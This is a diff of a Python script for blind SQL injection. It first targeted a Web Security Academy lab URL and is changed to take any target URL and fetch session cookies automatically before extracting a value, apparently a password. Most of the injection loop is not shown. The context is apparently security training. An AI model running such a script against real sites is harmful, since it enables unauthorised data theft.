@@ -1,23 +1,23 @@
 #!/usr/bin/python3
-
-#Exploiting blind SQL injection by triggering conditional responses
-
+# -*- coding: utf-8 -*-
 import requests
 import sys
 import string
 
-if len(sys.argv) != 2:
-    print('USAGE: blind.py <word to grep>')
+
+if len(sys.argv) != 3:
+    print('USAGE: blind.py <url> <word to grep>')
     sys.exit(1)
 
 print("Please update the session and also playload based on your needs and the db values")
 
-TrackingId = "TrackingId=rIXQ0euA98n1Rau6"
-session = "; session=GTfIvxW0vHT53TL9UfGkDBR1n8jVMZpl"
+url = sys.argv[1]
+r = requests.get(url)
+
+TrackingId = "TrackingId=" + r.cookies["TrackingId"]
+session = "; session=" + r.cookies["session"]
 len_found = False
-word = sys.argv[1]
-url = \
-    'https://acec1f721ee5b78680ef4ece002b00b0.web-security-academy.net/filter?category='
+word = sys.argv[2]
 count = 1
 while (len_found == False):
     ok = "Trying..." + str(count)
@@ -95,3 +95,4 @@ for i in range(1, l):
             inti = current
         elif t == 1:
             j = current
+print(passs)
